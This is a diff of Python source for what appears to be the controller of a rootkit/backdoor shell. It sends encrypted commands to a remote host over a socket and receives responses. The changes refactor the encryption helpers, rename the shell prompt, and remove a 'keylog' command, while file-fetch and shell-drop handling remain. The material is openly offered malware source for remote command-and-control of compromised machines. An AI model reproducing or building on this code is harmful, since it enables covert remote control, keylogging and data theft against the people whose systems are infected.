@@ -3,21 +3,20 @@ from os import system, listdir, fork, wait
 from socket import error as socket_error
 
 
-from utils.crypto import crypto_run
+from utils.crypto import encrypt, decrypt
 
 
 def get_cmd():
     cmd = ""
     while cmd == "":
-        cmd = input("[rootkit_backdoor_shell] >>> ")
+        cmd = input("[backdoor_shell] >>> ")
     return cmd
 
 
 def send_cmd(conn, cmd):
     try:
-        encoded_cmd = cmd.encode("utf-8")
-        encrypted_cmd = crypto_run("encrypt", encoded_cmd)
-        conn.send(encrypted_cmd)
+        crypt_cmd = encrypt(cmd)
+        conn.send(crypt_cmd)
     except socket_error:
         stderr.write("Error sending command\n")
     return conn 
@@ -39,9 +38,8 @@ def drop_shell(shell_port, status):
 def recv_msg(conn, buffer):
     msg = ""
     try:
-        encrypted_msg = conn.recv(buffer)
-        encoded_msg = crypto_run("decrypt", encrypted_msg) 
-        msg = encoded_msg.decode("utf-8")
+        crypt_msg = conn.recv(buffer)
+        msg = decrypt(crypt_msg) 
     except socket_error:
         stderr.write("[x] Error receiving response\n")
     return conn, msg
@@ -81,9 +79,6 @@ def builtin_cmds(conn, cmd, shell_port, status):
         filename = cmd[3:]
         conn = send_cmd(conn, cmd)
         conn, msg = recv_msg(conn, 64000)
-    elif cmd[:6] == "keylog":
-        conn = send_cmd(conn, cmd[:6])
-        conn, msg = recv_msg(conn, 4096)
     else:
         msg = "[x] Command not found"
     return conn, status, msg
@@ -104,7 +99,7 @@ def display_response(conn, msg):
         conn, msg = recv_msg(conn, 1024)
     validate_msg(msg)
     return conn
-            
+
 
 def cmd_shell(conn, shell_port, status):
     while status != 1:
